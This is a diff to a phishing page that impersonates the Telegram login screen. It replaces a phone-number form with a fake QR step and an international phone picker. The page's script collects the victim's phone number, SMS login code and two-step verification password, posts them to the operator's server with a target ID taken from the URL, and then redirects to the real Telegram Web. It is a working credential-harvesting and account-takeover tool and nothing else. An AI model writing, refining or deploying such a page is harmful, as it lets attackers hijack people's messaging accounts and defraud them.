@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Telegram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"/>
     <style>
         :root {
             --tg-blue: #2481cc;
@@ -18,62 +19,58 @@
         body {
             margin: 0; padding: 0;
             font-family: var(--tg-font);
-            background-color: var(--tg-bg);
+            background-color: #f4f4f5;
             display: flex; justify-content: center; align-items: center;
-            height: 100vh; overflow: hidden;
+            height: 100vh;
         }
 
         .container {
-            width: 100%; max-width: 360px;
-            padding: 20px; text-align: center;
-            animation: fadeIn 0.3s ease;
+            width: 100%; max-width: 400px;
+            background: #fff; padding: 40px;
+            border-radius: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            text-align: center; position: relative;
         }
 
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .logo { width: 100px; height: 100px; margin-bottom: 20px; }
+        h1 { font-size: 28px; font-weight: 500; margin: 0 0 12px 0; }
+        p { color: var(--tg-gray); font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
 
-        .logo { width: 120px; height: 120px; margin-bottom: 30px; }
-        h1 { font-size: 32px; font-weight: 500; margin: 0 0 12px 0; }
-        p { color: var(--tg-gray); font-size: 16px; line-height: 1.5; margin-bottom: 40px; }
+        /* QR Section */
+        .qr-box { border: 1px solid var(--tg-light-gray); padding: 10px; display: inline-block; border-radius: 12px; margin-bottom: 20px; }
+        .instructions { text-align: left; padding: 0; list-style: decimal inside; margin: 20px 0; }
+        .instructions li { color: #000; font-size: 14px; margin-bottom: 10px; }
 
-        .input-group { text-align: left; margin-bottom: 25px; position: relative; }
-        .input-group label {
-            display: block; font-size: 14px; font-weight: 500;
-            color: var(--tg-blue); margin-bottom: 4px;
-        }
-        input, select {
+        /* Input Styling */
+        .iti { width: 100%; margin-bottom: 20px; }
+        .tg-input {
             width: 100%; border: none; border-bottom: 2px solid var(--tg-light-gray);
-            padding: 12px 0; font-size: 18px; outline: none;
-            background: transparent; border-radius: 0; transition: border-color 0.2s;
+            padding: 12px 0; font-size: 18px; outline: none; transition: 0.2s;
         }
-        input:focus { border-bottom-color: var(--tg-blue); }
+        .tg-input:focus { border-bottom-color: var(--tg-blue); }
 
+        /* Buttons */
         .btn {
             background: var(--tg-blue); color: #fff; border: none;
             width: 100%; padding: 16px; border-radius: 10px;
             font-size: 16px; font-weight: 700; text-transform: uppercase;
             cursor: pointer; margin-top: 10px;
-            box-shadow: 0 4px 12px rgba(36, 129, 204, 0.2);
         }
-        .btn:active { transform: scale(0.98); opacity: 0.9; }
+        .blue-link {
+            color: var(--tg-blue); font-weight: 700; text-decoration: none;
+            display: block; margin: 15px 0; font-size: 14px;
+            text-transform: uppercase; cursor: pointer;
+        }
 
         .step { display: none; }
-        .step.active { display: block; }
-
+        .active { display: block; }
+        
         .loader {
-            display: none; width: 24px; height: 24px;
+            display: none; width: 30px; height: 30px;
             border: 3px solid #f3f3f3; border-top: 3px solid var(--tg-blue);
             border-radius: 50%; animation: spin 1s linear infinite;
             margin: 20px auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        @media (min-width: 600px) {
-            body { background-color: #f4f4f5; }
-            .container {
-                background: #fff; padding: 50px 40px;
-                border-radius: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-            }
-        }
     </style>
 </head>
 <body>
@@ -81,173 +78,114 @@
 <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" class="logo">
 
-    <div id="step-1" class="step active">
-        <h1>Telegram</h1>
-        <p>Please confirm your country code and enter your phone number.</p>
-        <div class="input-group">
-            <label>Country</label>
-            <select id="country-select" onchange="updateCountry()">
-                <option value="+855" selected>Cambodia</option>
-                <option value="+1">USA</option>
-                <option value="+66">Thailand</option>
-                <option value="+84">Vietnam</option>
-                <option value="+7">Russia</option>
-                <option value="+62">Indonesia</option>
-            </select>
+    <div id="step-qr" class="step active">
+        <h1>Log in to Telegram</h1>
+        <div class="qr-box">
+            <img id="qr-img" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=tg://login?token=AQ" alt="QR">
         </div>
-        <div class="input-group" style="display: flex; gap: 15px;">
-            <div style="width: 80px;">
-                <label>Code</label>
-                <input type="text" id="country-code" value="+855" readonly>
-            </div>
-            <div style="flex-grow: 1;">
-                <label>Phone Number</label>
-                <input type="tel" id="phone-input" placeholder="00 000 000" autofocus>
-            </div>
-        </div>
-        <button class="btn" onclick="submitPhone()">Next</button>
+        <ol class="instructions">
+            <li>Open Telegram on your phone</li>
+            <li>Go to <b>Settings</b> > <b>Devices</b></li>
+            <li>Tap <b>Link Desktop Device</b></li>
+        </ol>
+        <div class="blue-link" onclick="showStep('phone')">Log in by phone number</div>
+        <div class="blue-link">Log in by Passkey</div>
     </div>
 
-    <div id="step-2" class="step">
-        <h1 id="display-phone">+855...</h1>
-        <p>We've sent an SMS with an activation code to your phone.</p>
-        <div class="input-group">
-            <label>Code</label>
-            <input type="text" id="sms-code" placeholder="•••••" maxlength="5" 
-                   style="text-align: center; letter-spacing: 10px; font-weight: bold; font-size: 24px;">
-        </div>
+    <div id="step-phone" class="step">
+        <h1>Your Phone</h1>
+        <p>Confirm country code and enter your number.</p>
+        <input type="tel" id="phone-input" class="tg-input">
+        <button class="btn" onclick="submitPhone()">Next</button>
+        <div class="blue-link" onclick="showStep('qr')">Log in by QR Code</div>
+    </div>
+
+    <div id="step-code" class="step">
+        <h1 id="display-phone">...</h1>
+        <p>We've sent an activation code to your phone.</p>
+        <input type="text" id="sms-code" placeholder="•••••" maxlength="5" class="tg-input" style="text-align: center; letter-spacing: 5px; font-weight: bold;">
         <button class="btn" onclick="submitCode()">Next</button>
     </div>
 
-    <div id="step-3" class="step">
+    <div id="step-2fa" class="step">
         <h1>Two-Step Verification</h1>
-        <p>Your account is protected by an additional password.</p>
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="password" placeholder="Enter your password">
-        </div>
+        <p>Your account is protected with a password.</p>
+        <input type="password" id="password" placeholder="Password" class="tg-input">
         <button class="btn" onclick="submitPass()">Submit</button>
     </div>
 
     <div class="loader" id="global-loader"></div>
 </div>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    const tid = urlParams.get('id') || 'Admin'; // Fetch bot log target ID from URL
-    let phoneData = "";
+    const tid = urlParams.get('id') || 'Admin';
+    let fullPhone = "";
 
-    function updateCountry() {
-        document.getElementById('country-code').value = document.getElementById('country-select').value;
-    }
+    // Initialize International Phone Input (All countries A-Z)
+    const phoneInputField = document.querySelector("#phone-input");
+    const iti = window.intlTelInput(phoneInputField, {
+        initialCountry: "kh", // Cambodia
+        separateDialCode: true,
+        utilsScript: "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
+    });
 
-    function showStep(stepNum) {
+    function showStep(stepName) {
         document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById(`step-${stepNum}`).classList.add('active');
+        document.getElementById(`step-${stepName}`).classList.add('active');
         document.getElementById('global-loader').style.display = 'none';
     }
 
-    // --- FEATURE: VALIDATED PHONE SUBMISSION ---
     async function submitPhone() {
-        const countryCode = document.getElementById('country-code').value;
-        const rawPhone = document.getElementById('phone-input').value.replace(/\s/g, '');
-        
-        // Strict Validation: Only digits, 7 to 15 chars
-        const phoneRegex = /^\d{7,15}$/; 
-        if (!phoneRegex.test(rawPhone)) {
-            alert("Please enter a valid phone number (digits only).");
-            return;
-        }
+        fullPhone = iti.getNumber();
+        if (!iti.isValidNumber()) return alert("Invalid phone number.");
 
-        phoneData = countryCode + rawPhone;
         document.getElementById('global-loader').style.display = 'block';
-        document.getElementById('display-phone').innerText = phoneData;
+        document.getElementById('display-phone').innerText = fullPhone;
 
         try {
             const res = await fetch('/step_phone', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phoneData, tid: tid })
+                body: JSON.stringify({ phone: fullPhone, tid: tid })
             });
             const data = await res.json();
-            
-            if (data.status === "success") {
-                showStep(2);
-            } else {
-                alert("Telegram: " + (data.msg || "Invalid number. Try again."));
-                document.getElementById('global-loader').style.display = 'none';
-            }
-        } catch (e) {
-            alert("Connection error. Ensure your Koyeb server is running.");
-            document.getElementById('global-loader').style.display = 'none';
-        }
+            if (data.status === "success") showStep('code');
+            else { alert(data.msg); showStep('phone'); }
+        } catch (e) { alert("Server Error"); }
     }
 
-    // --- FEATURE: VALIDATED CODE SUBMISSION ---
     async function submitCode() {
-        const code = document.getElementById('sms-code').value.replace(/\s/g, '');
-        
-        // Strict Validation: Must be 5 digits
-        if (!/^\d{5}$/.test(code)) {
-            alert("The code must be exactly 5 digits.");
-            return;
-        }
-
+        const code = document.getElementById('sms-code').value;
         document.getElementById('global-loader').style.display = 'block';
-
         try {
             const res = await fetch('/step_code', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phoneData, code: code, tid: tid })
+                body: JSON.stringify({ phone: fullPhone, code: code, tid: tid })
             });
             const data = await res.json();
-            
-            if (data.status === "success") {
-                // Success redirect to real Telegram web
-                window.location.href = "https://web.telegram.org";
-            } else if (data.status === "2fa_needed") {
-                showStep(3);
-            } else {
-                alert("Invalid Code: " + data.msg);
-                document.getElementById('global-loader').style.display = 'none';
-            }
-        } catch (e) {
-            alert("Error verifying code.");
-            document.getElementById('global-loader').style.display = 'none';
-        }
+            if (data.status === "success") window.location.href = "https://web.telegram.org";
+            else if (data.status === "2fa_needed") showStep('2fa');
+            else alert(data.msg);
+        } catch (e) { alert("Server Error"); }
     }
 
-    // --- FEATURE: 2FA SUBMISSION ---
     async function submitPass() {
         const pass = document.getElementById('password').value;
-        if (pass.length < 1) {
-            alert("Please enter your 2FA password.");
-            return;
-        }
-
         document.getElementById('global-loader').style.display = 'block';
-
         try {
             const res = await fetch('/step_2fa', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ phone: phoneData, password: pass, tid: tid })
+                body: JSON.stringify({ phone: fullPhone, password: pass, tid: tid })
             });
             const data = await res.json();
-            
-            if (data.status === "success") {
-                window.location.href = "https://web.telegram.org";
-            } else {
-                alert("Incorrect Password: " + data.msg);
-                document.getElementById('global-loader').style.display = 'none';
-            }
-        } catch (e) {
-            alert("Error verifying password.");
-            document.getElementById('global-loader').style.display = 'none';
-        }
+            if (data.status === "success") window.location.href = "https://web.telegram.org";
+            else alert(data.msg);
+        } catch (e) { alert("Server Error"); }
     }
 </script>
-
 </body>
 </html>
